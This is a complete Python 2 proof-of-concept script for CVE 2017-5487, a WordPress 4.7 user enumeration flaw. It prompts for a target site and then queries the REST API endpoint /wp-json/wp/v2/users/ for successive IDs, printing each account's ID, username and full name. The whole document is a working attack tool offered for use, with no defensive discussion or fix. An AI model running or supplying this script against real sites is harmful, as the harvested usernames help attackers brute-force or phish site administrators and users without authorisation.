import requests
import json
print "#############################################################"
print "\tWordpress 4.7 User Enumeration PoC (CVE 2017-5487)\n\t\t\tWPVDB ID: 8715\n\n\t\t\tBy Alienwithin"
print "#############################################################\n\n"
targetSite = raw_input("Please enter the URL to target e.g. http://target.com : \nSite URL: ")
NumberOfUsers = raw_input("Please enter the number of users to retrieve e.g. 10\n")
print "ID ||  Username || Full Name\n\n"
for users in range(1, int(NumberOfUsers)):
	req = requests.get(targetSite+'/wp-json/wp/v2/users/'+str(users))
	target_info_parsed = json.loads(req.text)
	if 'id' not in target_info_parsed:
		print "No user with ID :" + str(users)
		req.close()
	else:
		target_id = target_info_parsed['id']
		target_name = target_info_parsed['name']
		target_username = target_info_parsed['slug']
		print str(target_id)+ " || "+ str(target_username) + " || "+ str(target_name)+"\n"
		req.close()
		
